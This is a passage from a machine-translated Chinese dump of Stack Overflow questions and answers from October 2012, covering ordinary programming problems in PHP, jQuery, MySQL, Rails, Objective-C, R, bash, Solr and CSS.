        if(!in_array($curimg, $ignore)) {
            echo "<div id='button'> <dir id='button_inside'> <img src='".$dirname.$curimg."'> </img> </dir> </dir>";

        }

    }              

?> 
```

//-------------------------- { CSS }-------- ----//

```
#button {
border: 1px solid #999;
border-radius: 15px;
box-shadow: 0px 3px 10px rgba(0,0,0,0.37);
height: 57px;
width: 57px;
float: left;
background-color: #FFF;
}
#button_inside {
float: left;
border-radius: 14px;
height: 55px;
width: 55px;
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
box-shadow: inset 0px 0px 0px 1px rgba(0,0,0,0.25);
background: rgb(242,242,242); /* Old browsers */
background: -moz-linear-gradient(top,  rgba(242,242,242,1) 7%, rgba(255,255,255,1) 21%, rgba(226,226,226,1) 77%, rgba(226,226,226,1) 86%, rgba(254,254,254,1) 94%, rgba(211,211,211,1) 98%); /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(7%,rgba(242,242,242,1)), color-stop(21%,rgba(255,255,255,1)), color-stop(77%,rgba(226,226,226,1)), color-stop(86%,rgba(226,226,226,1)), color-stop(94%,rgba(254,254,254,1)), color-stop(98%,rgba(211,211,211,1))); /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top,  rgba(242,242,242,1) 7%,rgba(255,255,255,1) 21%,rgba(226,226,226,1) 77%,rgba(226,226,226,1) 86%,rgba(254,254,254,1) 94%,rgba(211,211,211,1) 98%); /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top,  rgba(242,242,242,1) 7%,rgba(255,255,255,1) 21%,rgba(226,226,226,1) 77%,rgba(226,226,226,1) 86%,rgba(254,254,254,1) 94%,rgba(211,211,211,1) 98%); /* Opera 11.10+ */
background: -ms-linear-gradient(top,  rgba(242,242,242,1) 7%,rgba(255,255,255,1) 21%,rgba(226,226,226,1) 77%,rgba(226,226,226,1) 86%,rgba(254,254,254,1) 94%,rgba(211,211,211,1) 98%); /* IE10+ */
background: linear-gradient(to bottom,  rgba(242,242,242,1) 7%,rgba(255,255,255,1) 21%,rgba(226,226,226,1) 77%,rgba(226,226,226,1) 86%,rgba(254,254,254,1) 94%,rgba(211,211,211,1) 98%); /* W3C */

filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f2f2f2', endColorstr='#d3d3d3',GradientType=0 ); /* IE6-9 */

}

img {
float: left;
height: 40px;
width: 40px;

overflow: visible;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:34:36.010

你可能在那里有一个type-o....

```
<div...><dir...>...</dir></dir> 
```

div/dir 混合你已经开始了吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:34:44.903

不是真正的 php 问题，因为 PHP 只是输出 HTML。

一个问题是您有多个具有相同 ID 的元素。改为a `class`。

示例：`id="button"`应该是`class="button"`.

还要更改您的 CSS，使其匹配类而不是 ID：

`#button {`应该`.button {`

另一个是你的一些元素`dir`不是`div`.

我在 Chrome 的开发工具上将其拉出，它显示`#button_inside`左侧填充为 40 像素。我没有看到它在任何地方定义，但`padding: 0`在其上设置样式似乎将元素放置到位。不过，在做任何其他事情之前，请先解决代码问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:36:08.323

我认为问题出在你的`<dir>`标签上。一旦我将它们更改为`<div>`它们似乎符合要求。

此外，`<dir>`从 HTMl 4.01 开始，它是一个已弃用的标签，并已从 HTML 5 中删除，因此您真的不想使用它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:48:24.940

尝试类似的东西

```
<?php
foreach(glob("artwork/logo/*") as $f) {
    echo <<<HTML
        <div class="button" style="background-repeat: no-repeat;
             background-image: url('$f');">
        </div>
HTML;
} 
```

注意'HTML;'的位置 很重要，请参阅[有关 heredoc 字符串的 php 文档](http://php.net/heredoc)。

# javascript - Jquery 内容滑块问题

> ID：13167719
> 
> 赞同：0
> 
> 时间：2012-10-31T21:30:06.823
> 
> 标签：javascript, jquery, html, css, slider

我在尝试使此代码正常工作时遇到了一些问题，由于某种原因，我似乎无法找到问题所在。如果有人知道我可以做些什么来让它显示一张幻灯片大约 3 秒，然后淡出并显示一个新的，最后回到第一个并循环，那就太好了！下面我发布了我现在拥有的代码。我真的需要一些帮助，因为这个项目将在 2 周内到期，我还有很多工作要做，谢谢！

```
 <section class="clearfix">
    <div id="snapshots">
        <article>
            <img src="http://static.tumblr.com/dbek3sy/4mem1qr1m/themes_image.png">
        </article>
        <article>
            <img src="http://static.tumblr.com/dbek3sy/q8Em247a0/slidehome_4.png">
        </article>
        <article>
            <img src="http://static.tumblr.com/dbek3sy/dsLm2trr5/slidehome_5.png">
        </article>
    </div>
    </section>​

    /* joey content slider function */
    window.onload = function() { 

    var time = 1500;
    var content = $('#snapshots');
    var cont = 1;

    // MARK THE ARTICLES AND CONTENT
    $(function article(){

    // how many slides 
    // an = article number
    var an = content.find("article").length;

    // define the amount of slides in a class name 
    // example: <div class="slides_6">
    content.addClass("slides_"+an);

    // slide switcher 
    content.append('<div id="switch"></div>');

    };

// FIND AND MARK SLIDES
$(function slides() {
    numb = 1;
    content.find("article").each(function(){
        $(this).addClass("slide_"+numb);
        numb++;
        $(this).hide();
    });

    //setTimeout("", 4000);
}

function slider(content, time){
    content.fadeOut(time, function() {

    // plus 1 slide 
    var conta = cont+1;

    $("article.slide_"+conta).animate({
        "display": "block"
    },1500);

    $("article.slide_"+cont).animate({
        "display": "none"
    },1500);

    setTimeout("doitdude()", 4000);

    });

}

// RESET SLIDE
function reset(content, time) {

    // fade out content 
    content.fadeOut(time, function(){

    // while fading out 

    // show first slide 
    $("article.slide_1").animate({
        "display": "block"
    },1500);
     // hide the last one 
    $("article.slide_"+conta).animate({
        "display": "none"
    },1500);

    // end transition
    });

    setTimeout("doitdude()", 4000);
}

function doitdude() {
    if(cont < an) {
        slider(content, 1000);
        cont++;
    }
    else{
        var conta = cont;
        var cont = 1;
        // reset code here:
        reset()
    }

};​

    #snapshots { overflow: hidden; height: 410px; width: auto; }
    #snapshots img { }​ 
```

**注意：**我不能使用插件，因为我正在尝试自己制作。谢谢！

这里还有一个 JsFiddle：

[http://jsfiddle.net/UYE4E/](http://jsfiddle.net/UYE4E/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:37:52.547

您的函数声明不正确。可能您正在尝试执行以下操作：

```
(function($) {
    function foo(){
        //foo body
    };
}(jQuery) ); 
```

无论如何，请阅读 JS 作用域和闭包。

[第 1](http://robertnyman.com/2008/10/09/explaining-javascript-scope-and-closures/) [条 第 2 条](http://jibbering.com/faq/notes/closures/)

# objective-c - AWS iOS 开发工具包 simpleDB 项目计数

> ID：13167720
> 
> 赞同：0
> 
> 时间：2012-10-31T21:30:09.280
> 
> 标签：objective-c, ios, amazon-web-services, amazon-simpledb

我刚开始使用 Amazon Web Services SimpleDB 开展一个项目。在一种方法中，我试图通过使用`select query`.

代码如下所示：

```
AmazonSimpleDBClient *dbClienet = [[AmazonSimpleDBClient alloc]initWithAccessKey:_secret withSecretKey:_hiddenSecret];
NSString *countRequestString = [NSString stringWithFormat:@"select count(*) from %@",domain];
SimpleDBSelectRequest *countRequest = [[SimpleDBSelectRequest alloc]initWithSelectExpression:countRequestString];
SimpleDBSelectResponse *countResponse = [dbClienet select:countRequest]; 
```

这工作得很好。例如：连接有效，当我记录它时，响应似乎也是正确的：

```
{Items: (
"{Name: Domain,AlternateNameEncoding: (null),Attributes: (\n    \
"{Name: Count,AlternateNameEncoding: (null),Value: 2,AlternateValueEncoding: (null),<SimpleDBAttribute: 0x756f730>}\"\n),<SimpleDBItem: 0x7529d00>}"),NextToken: (null),{BoxUsage: 0.000023,{requestId: b683ed01-9e5f-9041-1ace-cbb0fdfaa799}}} 
```

我接下来要做的是将值保存`2`到`NSInteger itemCount`. 这是我挣扎的地方。我尝试了几件事，最远的是：

```
NSInteger itemCount = [[[[[countResponse.items objectAtIndex:0]attributes]objectAtIndex:1]value]integerValue]; 
```

这应该在我眼中起作用。但它会引发错误：

```
Multiple methods named 'value' found with mismatched result, parameter type or attributes 
```

谁能指出我哪里出错了？我真的被困在这里了。

谢谢，塞巴斯蒂安

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T14:17:44.930

感谢 geraldWilliam 的评论，我明白了：

```
 NSString *countRequestString = [NSString stringWithFormat:@"select count(*) from %@",domain];
    SimpleDBSelectRequest *countRequest = [[SimpleDBSelectRequest alloc]initWithSelectExpression:countRequestString];
    SimpleDBSelectResponse *countResponse = [dbClienet select:countRequest];
    NSArray* attributes = [[countResponse.items objectAtIndex:0]attributes];
    for (SimpleDBAttribute*attr in attributes) {
        if ([attr.name isEqualToString:@"Count"]) {
            itemCount = [attr.value integerValue];
        }
    } 
```

这种方法有效。

# mysql - 如果在工作日，MySQL 会将天数添加到列字段

> ID：13167723
> 
> 赞同：0
> 
> 时间：2012-10-31T21:30:17.510
> 
> 标签：mysql, if-statement

我有一个名为 pmday 的参数，当它被输入时，我想检查这一天是在星期六还是星期日，如果是，则显示之后的星期一。

我对 mySQL 比较陌生，我正在运行 SELECT 语句以其他方式使用 pmday。我可以创建一个列，仅在当天是周末的情况下显示之后的星期一吗？

这是我一直在尝试（但失败）做的一个例子。我不确定这是否只是我不知道如何使用 select 语句中的函数或一般格式和逗号使用的问题。

谢谢！

```
SELECT
    pmday AS EnteredDate,
    IF DateFormat(pmday, '%W') = 'Saturday' then
         Date_Add('pmday', INTERVAL 2 DAY) AS FollowingMonday
    Else If  DateFormat(pmday, '%W') = 'Sunday'  then
         Date_Add('pmday', INTERVAL 1 DAY) AS FollowingMonday
    END IF; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:48:48.800

```
SELECT
    pmday AS EnteredDate,
    CASE Date_Format(pmday, '%W')
        WHEN 'Saturday' THEN Date_Add(pmday, INTERVAL 2 DAY)
        WHEN 'Sunday' THEN Date_Add(pmday, INTERVAL 1 DAY)
        ELSE pmday
    END AS FollowingMonday
; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:49:24.773

你的if语句是错误的..

这对我有用...

```
set @pmday = current_date;

select 
    if(Date_Format(@pmday, '%W') = 'Saturday',
   Date_Add(@pmday, INTERVAL 2 DAY), 

    if(Date_Format(@pmday, '%W') = 'Sunday',
   Date_Add(@pmday, INTERVAL 1 DAY), @pmday)
); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:55:07.820

--- 如果选定的日期是星期六或星期日，则查找下一个星期一

```
set @pmday = "2012-10-20";
select if(
           DAYOFWEEK( @pmday) = 1 or DAYOFWEEK( @pmday) = 7
           , DATE_ADD( @pmday, INTERVAL (9 - IF(DAYOFWEEK( @pmday)=1, 8, DAYOFWEEK( @pmday))) DAY) 
           , @pmday
          ); 
```

# php - 将 php 项目移动到 codeigniter 或更新现有框架

> ID：13167726
> 
> 赞同：5
> 
> 时间：2012-10-31T21:30:29.780
> 
> 标签：php, codeigniter, laravel, framework-migration

我正在尝试找出处理 php 项目的最佳方式。它是几年前在一个自定义框架上构建的——该框架不是严格的 MVC ......它只是有控制器、视图和库。

从那以后我添加了额外的功能，它开始感觉很像一团糟，旧代码和新代码混合在一起，没有像样的数据库管理。

我正在努力决定我最好的选择是什么。一方面，我可以继续修补现有的代码库，希望我可以使它更有用和面向未来，或者转向 codeigniter（注意：我说 codeigniter，因为我有相当多的经验）。

Codeigniter 选项显然意味着我必须经历所有事情，并且毫无疑问会进行大量的重新编码，但从长远来看，这可能是值得的。

我正在考虑另一种选择，那就是 Laravel 框架。我没有直接的经验，但是我听说 Laravel 4（尚未发布）应该很棒。

那么，把这三个选项放在桌面上，你会选择哪个，为什么？我正在寻找一个令人信服的理由来选择一个而不是另一个，坦率地说，我不知道我目前最好走哪条路线！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:50:36.097

## [简短的回答：*两者都不是*。]

## 现在有点长版本..

我的印象是，您对框架旨在解决哪些问题感到困惑。当您使用框架时，您获得的是更短的简单应用程序开发。你总是失去的是性能，通常是可维护性。

框架旨在为您提供解决简单问题的工具。这意味着有很多东西是你不需要的。还有一些问题，框架不能解决甚至积极阻碍你制定解决方案的努力。

## 你应该怎么做..

重构你的代码。

如果你已经在这个项目上工作了很长时间，你会从这次经历中学到很多教训。通过改进现有代码库来利用它们。

*   如果您的架构中存在缺陷：**重组损坏的部分**
*   如果您不确定，是否可行：**添加单元测试**
*   如果某些事情看起来很慢：**分析您的编码和优化**
*   如果您不知道某事的作用：**找出并添加评论**

这样，您将提高您的项目和技能。

> [**PS**
> 即使您开始新项目，我也建议您避免使用这两种框架。它们都充满了糟糕的实践和更糟糕的代码：无处不在的全局状态、程序化编程、对 MVC 的误解、无视 OOP 原则和法律。]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:33:22.643

我实际上已经有了这方面的经验，因为我最近将一个较旧的站点从本质上是模块化的模型视图设置移动到了 CodeIgniter（带有 MX 模块化扩展）。它并没有花太多时间，而且很容易将模型转换为 CodeIgniter 的 ActiveRecord 范式。

听起来你甚至没有任何模型转换要做，所以我想说转换到 CodeIgniter 应该不是太大的挑战，尤其是考虑到你的经验。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:33:31.830

没有明确的正确或答案——要么现在及时进行投资，要么在未来分散投资。

就个人而言，我会硬着头皮去迁移到 CI。如果您与代码作斗争而不是修复它，那么从长远来看，您在短期内付出的努力将是值得的。

大多数时候，将现有的 PHP 应用程序导入 CodeIgniter 并不需要太多时间——之后您只需要花更多时间重新组织代码即可。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-31T21:51:15.037

切换到 Laravel，它已经与 php v5.3+ 兼容，拥有一个很棒的社区。我确实在许多项目中使用了 CI，但与 Laravel 相处是我最好的决定之一。L3 是稳定的并且做得非常好，L4 将重新定义 php 的使用最大化效率。

如果您的旧系统以 OOP 标准的形式结构良好，那么您可以花一点时间将可用的药水迁移到 Laravel，并结合 Laravel 的超级功能来节省大量时间。例如，Laravel 使用称为 Eloquent 的结构良好的 ORM，并且可以在几分钟内捕捉到所有数据模型。如果你也看看活跃的社区，你会很高兴得到快速的支持。

# css - 哪种技术应该可以改变 tumblr 主题背景？

> ID：13167730
> 
> 赞同：0
> 
> 时间：2012-10-31T21:30:45.180
> 
> 标签：css, themes, customization, background-image, tumblr

我很困惑。这对我来说应该是初级的，但我不得不承认，到目前为止还没有任何效果。我有一个 tumblr 日志 (http://tropedart.tumblr.com)，我正在尝试在现有主题中使用图像作为背景。该图像存储在我的服务器上的公共文件夹和 tumblr 的服务器上。这是我尝试过的：

我使用以下内容编辑了自定义 HTML：

`<body style="background-image: url('http://russellbits.com/public-images/bkgd-page.jpg') fixed top left repeat;">`

我已经编辑了自定义 CSS：

`body { background-image: url('http://russellbits.com/public-images/bkgd-page.jpg') fixed top left repeat; }`

我*还*尝试在自定义 CSS 中使用模板标签：

`background: {color:Background} url(‘{image:http://24.media.tumblr.com/tumblr_mcs0mnVfx71rsijsso1_400.jpg}’) top left fixed repeat;`

这些努力都没有成功。我几乎不好意思问，因为这是我非常了解的简单 CSS 内容。但我能说什么呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:34:26.737

您的主题使用不直观的方法来设置背景图像。而不是一个适当的背景图像，只有一个大元素延伸到整个页面。

查看`127`样式表的行：

```
.noise {
    background: #EEEEEE url("http://static.tumblr.com/xcxngn2/Iz0ld1v2h/bg.png") repeat;
} 
```

要覆盖此样式，只需将此 CSS 放入您的自定义样式表中：

```
.noise {
    background: #EEEEEE url("http://russellbits.com/public-images/bkgd-page.jpg") repeat;
} 
```

# r - 文件写入行为因 R 中的操作系统而异？

> ID：13167732
> 
> 赞同：0
> 
> 时间：2012-10-31T21:31:03.823
> 
> 标签：r

我使用 R (2.15.1) 脚本将变量传递给外部编译的库函数。在计算期间，该函数（不是 R 脚本）创建了许多文件，这些文件在我的算法的每次迭代之后被写入和更新。

现在奇怪的部分。在 MacOS (Mountain Lion) 上运行，文件按预期创建和更新。我还可以在计算期间查看它们（tail -f）。在 Windows 和 Linux 上，文件在函数完成之前不会被写入。我更喜欢在计算过程中监控输出文件。

有没有人对这种行为有解释（以及在 Windows/Linux 中改变它的方法）？似乎是浪费内存的好方法......

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:39:00.887

R中有一个`flush`函数。每次迭代后只需刷新文件句柄。

# core-plot - 轴 X 线未显示在条形下方

> ID：13167735
> 
> 赞同：-1
> 
> 时间：2012-10-31T21:31:16.223
> 
> 标签：core-plot

为什么轴线 X 线不连续？

在每个条形下方，线条不会出现。

我应该怎么办 ？

下面是问题的图片

![显示问题的图像](../Images/d778d9b417ff98cb3019411602f77f9b.png)

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T00:49:25.360

默认情况下，条形图图层位于轴的顶部。看起来这些条在轴下方延伸，覆盖了部分线。检查条形图的“基值”。

# javascript - 茉莉咖啡脚本时钟无效

> ID：13167741
> 
> 赞同：0
> 
> 时间：2012-10-31T21:31:55.200
> 
> 标签：javascript, jasmine, specifications, jasmine-node

我没有从我的茉莉花中得到快乐。时钟。我的期望是代码将模拟时钟对象并在将滴答设置超过 setTimeout 中的指定间隔时触发 setTimeout 事件，但这似乎不起作用，我找不到我的缺陷。我的代码似乎与其他应用相同时钟控制行为的代码平行。

背景：“回调”函数在执行后将 this.action.state() 设置为 Constants.state.Ready，之前它应该是 Constants.state.WAITING。请注意，我使用的是淘汰赛 observables；该状态应该被称为 fx 以检索值。

```
describe "Redis GET Action", () ->
  beforeEach () ->
    jasmine.Clock.useMock();
    this.getReturnValue = getReturnValue = "Some jasmine values from redis"
    clientStub = 
      get: (key,callback) ->
        if callback?
          setTimeout(callback(undefined, getReturnValue),1500)
      GET: (key,callback) ->
        if callback?
          setTimeout(callback(undefined, getReturnValue),1500)

    this.action = new RedisGetAction(
      client: clientStub
      key: "Standard"
      )

  it "should return a object", () ->
    expect(this.action).toEqual(jasmine.any(Object))

  requiredMethods = ['state','data','params'];

  requiredMethods.forEach (methodName) ->
    it "should have public "+methodName+" method", () ->
      expect(this.action[methodName]).toBeDefined();

  it "should initialize with public accessible state of #{Constants.state.WAITING}", () ->
    expect(this.action.state()).toEqual(Constants.state.WAITING)
    jasmine.Clock.tick(1501);
    expect(this.action.state()).toEqual(Constants.state.READY) 
```

结果： 失败：

```
 1) should initialize with public accessible state of waiting
       Message:
         Expected 'ready' to equal 'waiting'.
       Stacktrace:
         Error: Expected 'ready' to equal 'waiting'. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T20:27:18.477

明确使用 jasmine.Clock.defaultFakeTimer.setTimeout 解决问题（丑陋）。

```
clientStub = 
  get: (key,callback) ->
    if callback?
      jasmine.Clock.defaultFakeTimer.setTimeout(callback(undefined, getReturnValue),1500) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T13:43:25.330

这是我的规范助手。它解决了问题 jasmine.getGlobal = function() { return GLOBAL; }

```
jasmine.getGlobal().setTimeout = function(funcToCall, millis) {
  if (jasmine.Clock.installed.setTimeout.apply) {
    return jasmine.Clock.installed.setTimeout.apply(this, arguments);
  } else {
    return jasmine.Clock.installed.setTimeout(funcToCall, millis);
  }
}; 
```

等等。jasmine.js 中的所有 4 行

# c# - 我应该使用 PictureBox 还是 Panel 在我的表单上绘图？

> ID：13167742
> 
> 赞同：8
> 
> 时间：2012-10-31T21:31:54.753
> 
> 标签：c#, winforms, graphics, panel, picturebox

是否有推荐的用于添加线条和圆圈的方法，以便我可以构建图表？我可能会在图表本身下使用背景图像。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-31T21:35:07.760

使用 a `PictureBox`- 稍后维护代码将是最容易的。在这种情况下， A`Panel`并不是真正有用，并且直接利用`Form`- 虽然它可以工作 - 会使以后更难进行更改。

只需处理`Paint`事件`PictureBox`并在那里完成所有绘图。

# mysql - 通过 find、sql 或 where 进行安全查询

> ID：13167743
> 
> 赞同：0
> 
> 时间：2012-10-31T21:31:55.823
> 
> 标签：mysql, ruby, ruby-on-rails-3, activerecord

我想在某个列表中找到所有具有通用名称或内部名称的小部件`query_list`。我可以

```
# Consider query_list = ["a","b","c"]
qlist = '(' + query_list.join(",") + ')'
# this makes 
widgets = Widget.find_by_sql("SELECT * FROM widgets 
     WHERE common_name IN #{qlist} OR internal_name IN #{qlist}") 
```

现在我有几个问题：

1.  关于 SQL 注入攻击，上述 find_by_sql 是否安全？好像可以把危险的东西放进去`query_list`。
    *   怎么写`.find_by_sql(["SELECT * FROM widgets WHERE common_name IN ? OR internal_name IN ?", ["a","b","c"], ["a","b","c"] ])`
    *   如果它不安全，我们可以让它安全吗？
2.  如果没有必要，我宁愿不写原始 sql。我知道我们可以在 中写入`AND`条件`find`，如在 中`.find(:conditions=>{:internal_name => ['a','b','c'], :common_name => ['a','b','c']})`。我们也可以`OR`用 find 写条件吗？
3.  怎么用`where`？这与使用有什么不同`find`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T05:10:39.047

带有占位符的版本可以安全地防止 SQL 注入，只要您不介意用户能够选择任意小部件，我假设您不会。根据您拥有的 Rails 版本，您可以避免使用链式编写原始 SQL；请参阅[Ruby on Rails 3 howto make 'OR' 条件](https://stackoverflow.com/questions/3291152/ruby-on-rails-3-howto-make-or-condition)。

请注意，如果列表为空或 is ，您的代码原样或使用占位符将导致数据库错误`[nil]`，因此最好在进行查询之前测试 query_list.first 是否存在。

# openssl - OpenSSL::SSL::SSLError - SSL_connect 返回=1 errno=0 state=SSLv3 读取服务器证书 B：证书验证失败：

> ID：13167747
> 
> 赞同：0
> 
> 时间：2012-10-31T21:32:03.133
> 
> 标签：openssl, sinatra, foreman

我使用 Heroku 部署了一个 Facebook 应用程序，并使其部分在本地工作。我可以看到我的应用程序，但我一点击与 Facebook 连接，就会收到内部服务器错误消息。这是福尔曼抛出的：

> `OpenSSL::SSL::SSLError - SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed:`

一切都适用于生产，但我需要让本地工作开始集成 Mongo 和 FB。

我遵循了以下所有说明：[https](https://devcenter.heroku.com/articles/facebook#working-locally) ://devcenter.heroku.com/articles/facebook#working-locally 。我创建了开发应用程序并相应地修改了 .env 文件。我创建了一个自签名证书，但我不确定这是否是以下内容。

我在 Mac OS 10.8.2 上运行 ruby​​ 1.9.3p194、OpenSSL 1.0.1c、sinatra 1.2.6 和 Foreman。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-20T14:09:34.417

我遇到了同样的问题并解决了

尝试将以下行添加到您的 Gemfile

```
gem 'certified' 
```

并执行

```
bundle 
```

再次运行！

# javascript - 有没有办法让多个 html5 filereader.onload 事件按顺序触发？

> ID：13167756
> 
> 赞同：2
> 
> 时间：2012-10-31T21:32:43.330
> 
> 标签：javascript

我正在使用 html5 filereader API 在本地获取照片，而无需用户上传它们。

在支持它的浏览器中，我允许多项选择，因此我循环选择的文件并对每个文件执行一个功能（TC.editor.renderSlide（）），如下所示：

```
 handlePhotoUploads: function(event) {
    var self = this;
    TC.dialog.destroy();
    var files = event.target.files;
    var count = files.length + TC.editor.cache.slides.length;
    for (var i = 0, f; f = files[i]; i++) {
        if (!f.type.match('image.*')) {
            continue;
        }
        var reader = new FileReader();
        var index = TC.editor.getNewSlidesIndex();
        TC.editor.addNewSlide('photo', index);
        reader.onload = (function(theFile) {
            var slideindex = index;
            return function(e) {
                TC.editor.renderSlide(slideindex, e.target.result, 'internal', count);
            };
        })(f);
        reader.readAsDataURL(f);
    }
}, 
```

问题是 TC.editor.renderSlide() 函数可能需要大量时间来执行（执行画布和 DOM 操作），因此在处理 8 个左右的大图像文件时，浏览器会被锁定很长时间。在此期间，甚至“处理 gif”也停止动画。

有没有办法确保每个 reader.onload 事件仅在前一个事件完成后触发？这样，用户可以通过查看每次调用 TC.editor.renderSlide() 的结果来定期更新进度，而不是在处理所有内容时锁定浏览器的当前情况？

我尝试向 renderSlide() 添加一个简单的 setTimeout 无济于事？

任何帮助或想法将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:48:58.053

事件*确实按顺序触发*`onload`，处理程序未执行，而当前正在处理另一个事件（“JS 是单线程的”）。*当您在处理程序中启动*一些异步处理（超时、动画、文件加载）时，这当然不计算在内。

 **在这种情况下，您将需要手动处理顺序处理。使用完成时执行的等待进程队列很容易：

```
var waiting = [];
// …create many parallel loaders, and on each:
    ….onevent = execute;

function execute(e) {
    if (waiting.active)
        waiting.push(e);
    else {
        waiting.active = true
        // do something that takes its time, supplying a
          … function callback(ready) {
            waiting.active = false;
            if (waiting.length)
                execute(waiting.shift()); // go on with next
          }
    }
} 
```

但是，在我看来，不是`renderSlide`导致问题，而是您同时实例化了这么多`FileReader`s。通过将你的 for 循环变成一个异步调用的“递归”函数，让他们一个接一个地开始加载文件：

```
var files = […]
(function handle(i) {
     if (i >= files.length) return;
     // create loader
     ….onevent = function(e) {
          // do processing, and then call
          handle(i+1);
          // or call that from another callback if you want to do async
          // processing, like "renderSlide"
     };
})(0); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:47:39.703

事件*确实*按顺序触发。Javascript 是单线程的，因此当您的一个事件处理程序正在执行时，不会触发其他事件，并且您的浏览器`*`仍然没有响应，因为它的单线程被运行您的 Javascript 事件处理程序占用。在 a中执行你的全部是不够`renderSlide()`的，因为在整个执行`setTimeout`期间浏览器仍将被锁定。`renderSlide()`您需要将*内部* `renderSlide()`的实际逻辑分解成单独的块*，每个*块都可以推迟使用`setTimeout(chunk, 1)`，给浏览器一点喘息的空间来保持响应能力。

`*`实际上，锁定的可能不是整个浏览器——它可能只是一个选项卡或一组在单个线程中运行的相关选项卡。实际的浏览器架构不同。**

# bash - 编写一个查找 greps 文件并仅输出这些文件名的 shell 脚本

> ID：13167762
> 
> 赞同：0
> 
> 时间：2012-10-31T21:33:03.880
> 
> 标签：bash, shell, grep, find

我想搜索特定文件夹和内容中的文件，然后我只想打印找到的文件的名称。我有一个命令：

```
for file in $(find from | xargs grep 'move')
do 
   echo $file
done 
```

它打印例如：

```
from/1.txt:move
from/2.txt:some text
move
from/3.txt:move text 
```

但我想要：

```
from/1.txt
from/2.txt
from/3.txt 
```

我试图通过使用以下方法来减少不必要的部分：

```
${file%:*} 
```

这给出了结果：

```
from/1.txt
from/2.txt
move
from/3.txt 
```

留下了那个“动作”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:48:19.317

Grep 有一个递归以及一个“仅列出文件名”选项，所以这应该可以工作：

```
grep -r -l "move" from 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:39:04.167

使用选项`-l`，`grep`即

```
for file in $(find from | xargs grep -l 'move')
do 
   echo $file
done 
```

甚至更好：

```
for file in $(find from -type f -print0 | xargs -r0 grep -l 'move')
do 
   echo $file
done 
```

# solr - 如何设置/配置 solr 索引文件的最大大小？

> ID：13167767
> 
> 赞同：1
> 
> 时间：2012-10-31T21:33:25.190
> 
> 标签：solr, full-text-search, search-engine, lucene

如何配置 Solr 索引文件的最大大小？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T02:28:55.120

根据讨论 - Solr 用户邮件列表上的[控制段大小](http://lucene.472066.n3.nabble.com/Control-segment-size-td497293.html)，不幸的是，没有任何方法可以控制 Solr 索引文件（也称为段）的最大大小。

为了使答案包含实际的详细信息，以下是线程中的详细信息：

您要设置：maxMergeDocs。“在合并段时，Lucene 将确保不会创建超过 maxMergeDocs 的段。”

无法将单个文件限制为特定大小。

单个段将包含不超过 maxMergeDocs 数量的文档。但是段的大小可能仍然不同，因为某些文档可能比其他文档具有更多的唯一标记。

您最初看到的一定是段合并，这是正常的并且发生在索引过程中。除了拥有高得离谱的mergeFactor（这会影响搜索性能）之外，我认为没有其他方法可以避免这种情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-04-23T09:11:17.510

从 solr 6 开始，现在可以设置段的最大大小。请注意，`maxMergeDocs`已**弃用**。

默认`mergePolicyFactory`值为`TieredMergePolicyFactory`. 它有一个`MaxMergedSegmentMB`控制段大小的属性。来自[javadocs](https://lucene.apache.org/core/6_6_0//core/org/apache/lucene/index/TieredMergePolicy.html)：

> 如果合并将生成大于 setMaxMergedSegmentMB(double) 的段，则该策略将合并更少的段（如果该段有删除，则一次减少到 1 个）以将段大小保持在预算范围内。

例如，将最大段大小设置为 3000 MB：

```
<mergePolicyFactory class="solr.TieredMergePolicyFactory">
    <int name="maxMergeAtOnce">10</int>
    <int name="segmentsPerTier">10</int>
    <int name="maxMergedSegmentMB">3000</int>
</mergePolicyFactory> 
```

# html - 标题页链接中有什么href？

> ID：13167772
> 
> 赞同：5
> 
> 时间：2012-10-31T21:33:40.060
> 
> 标签：html, hyperlink, href

我正在编写 HTML 代码，并且正在制作指向标题页的链接。我有两个想法：

1.  相对的：
    `<a href="/">`

2.  绝对的，例如：
    `<a href="http://www.example.com/">`

（假设我在 www.example.com 工作）
哪种方式更好？我想绝对方式更适合 SEO，因为您有指向您网站的链接。但也许绝对的方式也比较慢，因为浏览器必须询问 DNS 服务器并再次完全加载页面？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T23:36:24.907

假设页面在 www.example.com 域中并且没有`<base href=...>`标签，这两种结构是完全等价的。

